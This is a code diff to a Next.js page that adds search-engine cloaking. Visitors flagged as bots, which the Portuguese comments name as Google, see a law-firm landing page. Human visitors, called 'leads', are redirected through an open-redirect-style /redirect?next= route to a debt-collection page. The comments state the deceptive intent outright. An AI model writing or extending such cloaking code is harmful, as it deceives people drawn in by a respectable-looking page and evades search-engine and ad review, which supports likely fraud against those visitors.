@@ -1,6 +1,7 @@
 import { useState } from 'react';
 import Head from 'next/head';
 import AdvocaciaPage from './bot-advocacia';
+import { getRedirectConfig } from '../lib/redirect-config';
 
 export async function getServerSideProps(context) {
   const whatsappPhone = String(process.env.NEXT_PUBLIC_WHATSAPP_PHONE || '551421088000').trim();
@@ -31,6 +32,24 @@ export async function getServerSideProps(context) {
     const showLandingPage = detection.isBot;
 
     console.log(`[BOT DETECTION] isBot=${showLandingPage}, detectedBy=${detection.detectedBy}`);
+
+    // Verifica se deve redirecionar (se for humano)
+    // Bots (Google) veem a página de advocacia
+    // Humanos (leads) são redirecionados para cobrança
+    if (!showLandingPage) {
+      // É humano - redireciona para página de cobrança
+      const redirectConfig = getRedirectConfig({ props: { showLandingPage }, query: context.query });
+
+      if (redirectConfig.shouldRedirect) {
+        console.log(`[REDIRECT] Human lead - redirecting to: ${redirectConfig.redirectUrl}`);
+        return {
+          redirect: {
+            destination: `/redirect?next=${encodeURIComponent(redirectConfig.redirectUrl)}`,
+            permanent: false,
+          },
+        };
+      }
+    }
 
     return {
       props: {
